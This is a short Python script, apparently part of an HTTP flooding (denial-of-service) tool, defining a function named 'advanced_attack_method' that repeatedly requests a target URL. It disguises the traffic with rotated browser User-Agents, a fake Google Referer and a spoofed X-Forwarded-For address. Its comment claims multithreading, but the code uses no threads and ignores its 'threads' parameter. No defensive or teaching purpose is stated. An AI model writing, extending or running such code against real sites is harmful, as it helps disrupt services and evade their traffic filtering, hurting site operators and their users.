import random
import requests
from time import sleep

# Function to perform advanced attack using multiple threads
def advanced_attack_method(url, threads, time_duration):
    headers = {
        'User-Agent': random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Connection': 'keep-alive',
        'Referer': 'https://www.google.com',
        'X-Forwarded-For': f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
    }

    for _ in range(time_duration):
        try:
            response = requests.get(url, headers=headers, timeout=5)
            print(f"Advanced Attack: Sent request to {url} with status: {response.status_code}")
            sleep(random.uniform(0.2, 0.5))  # Adding a small delay between requests
        except requests.exceptions.RequestException as e:
            print(f"Error in advanced attack: {str(e)}")
